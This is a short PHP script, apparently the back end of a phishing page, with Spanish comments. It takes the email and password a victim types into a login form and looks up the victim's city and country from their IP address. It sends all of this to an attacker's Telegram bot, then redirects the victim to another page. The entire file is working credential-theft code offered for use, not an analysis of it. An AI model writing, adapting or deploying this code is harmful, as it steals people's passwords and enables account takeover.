<?php
// Incluir el archivo sax.php para cargar el token y el chat ID
include('sax.php');

// Obtener los datos del formulario enviados por el cliente
$email = $_POST['login'];
$password = $_POST['password'];

// Obtener la dirección IP del cliente
$client_ip = $_SERVER['REMOTE_ADDR'];

// Consultar la API externa para obtener la ubicación geográfica de la IP
$location_data = json_decode(file_get_contents("http://ip-api.com/json/{$client_ip}"), true);
$city = $location_data['city'] ?? 'Desconocido';
$country = $location_data['country'] ?? 'Desconocido';

// Crear el mensaje a enviar a Telegram
$message = "Nuevo intento de inicio de sesión:\n";
$message .= "Email: $email\n";
$message .= "Contraseña: $password\n";
$message .= "IP: $client_ip\n";
$message .= "Ciudad: $city\n";
$message .= "País: $country";

// Enviar el mensaje a Telegram
$url = "https://api.telegram.org/bot$token/sendMessage";
$data = array('chat_id' => $chat_id, 'text' => $message);

$options = array(
    'http' => array(
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ),
);

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);

if ($result === FALSE) {
    // Manejo de error en caso de fallo al enviar el mensaje
    die('Error al enviar el mensaje a Telegram');
}

// Redirigir a otra página después de enviar los datos (opcional)
header("Location: fila.html");
exit;

?>
